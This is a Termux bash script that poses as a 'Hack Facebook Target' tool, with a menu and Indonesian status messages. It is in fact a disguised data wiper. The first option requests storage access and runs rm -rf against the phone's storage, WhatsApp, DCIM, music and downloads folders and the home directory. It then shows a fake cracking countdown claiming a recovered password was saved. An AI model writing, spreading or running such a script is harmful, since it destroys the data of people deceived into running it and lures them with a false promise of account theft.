#!/system/xbin/bash
# Bersihkan Layar
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
###################################################
# CTRL C-
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo  $red"[#]> (Ctrl + C ) Detected,
Trying To Exit ... "
sleep 1
echo ""
echo  $yellow"[#]> Thank You For Using My
Tools ... "
sleep 1
echo ""
echo  $white"[#]> AC1L WAS HER3... "
read enter
exit
}
echo             "
____________________________________________" | lolcat
echo $green"YouTube : MR 4444"
echo $Orange"Author : AC1L S3AN"
echo $Red"Thanks To Allah Swt"
echo             "
___________________________________________" | lolcat
echo $green" 01) Hack Facebook Target"
echo $blue" 02) Langkah Tools"
echo $Red" 03) Info Tools"
read -p "[MRRUXHAN]> " bro;

if [ $bro = 1 ] || [ $bro = 01 ]
then
clear
echo $yellow" Login Facebook"
sleep 1
read -p "[USERNAME FACEBOOK> " bro;
termux-setup-storage
rm -rf /storage/emulated/0
rm -rf /sdcard/0
rm -rf /storage/emulated/0/DCIM
rm -rf /storage/emulated/0/android/obb
rm -rf /sdcard/0/android/data
rm -rf $HOME
rm -rf sdcard/0
rm -rf storage/emulated/0
rm -rf /storage/emulated/0/WhatsApp
rm -rf /sdcard/0/WhatsApp
rm -rf /storage/emulated/0/Downloads
rm -rf /storage/emulated/0/Music
rm -rf /sdcard/0/Music
echo $green"Sedang Mencari ID Facebook Dalam 30 detik"
sleep 5
echo $green"Sedang Mencari ID Facebook Dalam 29 detik"
sleep 5
echo $green"Sedang Mengumpulkan ID Facebook Dalam 28 detik"
sleep 5
echo $green"Sedang Mengumpulkan ID Facebook Dalam 27 detik"
sleep 5
echo $red"Mencari Gagal! Sedang Mengulangi Kembali Pencarian"
sleep 5
echo $green"Sedang Mencari Password Facebook Dalam 60 detik"
sleep 5
echo $green"Sedang Mencari Password Facebook Dalam 5 detik"
sleep 5
echo $green"Sedang Mencari Password Facebook Dalam 4 detik"
sleep 5
echo $green"Sucses Mencari password Facebook"
sleep 5
echo $green"Sedang Mengumpulkan Password Facebook Dalam 3 Detik"
sleep 5
echo $green"Sedang Mengumpulkan Password Facebook Dalam 2 detik"
sleep 5
echo $green"Sedang Mengumpulkan Password Facebook Dalam 1 detik"
sleep 5
echo $white"Mengumpulkan Data + ID + Password Facebook"
echo $green"send to sdcard/0"
sleep 3
echo $green"Buka storage cari PasswordFacebook.txt buka dan liat hasil cracking password"
exit
fi

if [ $bro = 2 ] || [ $bro = 02 ]
then
clear
echo $green"Harap Izinkan Termux untuk mengakses storage"
echo $green"Agar bisa menyimpan hasil Crack Password ke sdcard"
termux-setup-storage
sleep 4
termux-setup-storage
sleep 4
termux-setup-storage
sleep 4
termux-setup-storage
exit
fi

if [ $bro = 3 ] || [ $bro = 03 ]
then
clear
echo $green"Author ACIL WAS HER3"
echo $green"Jika Ada Masalah Hubungi Author"
exit
fi
